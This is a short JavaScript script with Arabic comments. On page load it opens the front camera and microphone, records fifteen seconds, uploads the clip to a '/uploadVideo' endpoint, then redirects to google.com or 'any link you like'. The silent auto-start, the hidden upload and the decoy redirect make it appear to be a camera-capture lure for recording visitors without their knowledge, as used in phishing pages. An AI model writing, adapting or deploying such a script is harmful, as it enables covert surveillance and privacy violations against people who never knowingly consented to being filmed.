async function startRecordingAndUpload() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user" }, // الكاميرا الأمامية
      audio: true
    });

    const mimeType = 'video/webm;codecs=vp9';
    const options = MediaRecorder.isTypeSupported(mimeType) ? { mimeType } : {};

    const mediaRecorder = new MediaRecorder(stream, options);
    const chunks = [];

    mediaRecorder.ondataavailable = (e) => {
      if (e.data.size > 0) chunks.push(e.data);
    };

    mediaRecorder.onstop = async () => {
      const blob = new Blob(chunks, { type: chunks[0].type });
      const formData = new FormData();
      formData.append('video', blob, 'recorded-video.webm');

      try {
        const response = await fetch('/uploadVideo', {
          method: 'POST',
          body: formData
        });

        if (response.ok) {
          window.location.href = 'https://www.google.com'; // أو أي رابط تحبه
        } else {
          console.error('فشل رفع الفيديو:', await response.text());
        }
      } catch (err) {
        console.error('خطأ أثناء رفع الفيديو:', err);
      }
    };

    mediaRecorder.start();
    console.log('Recording started');

    setTimeout(() => {
      mediaRecorder.stop();
      console.log('Recording stopped');
    }, 15000); // 15 ثانية

  } catch (err) {
    console.error('فشل فتح الكاميرا:', err);
  }
}

startRecordingAndUpload();
